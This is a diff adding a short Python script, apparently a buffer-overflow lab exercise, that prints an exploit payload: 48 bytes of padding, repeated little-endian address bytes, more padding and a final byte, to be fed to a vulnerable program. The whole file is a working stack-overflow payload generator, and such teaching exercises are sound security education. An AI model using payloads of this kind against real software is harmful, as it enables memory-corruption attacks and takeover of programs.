@@ -1,0 +1,10 @@
+#!/usr/bin/env python3
+
+import sys
+
+# Configure Python to print text strings like byte strings. Don't remove this!
+sys.stdout.reconfigure(encoding='latin1')
+
+### YOUR CODE HERE ###
+
+print("A" * 48 + "\xbc\xff\xdf\xdf" * 2 + "A" * 8 + "\x20")
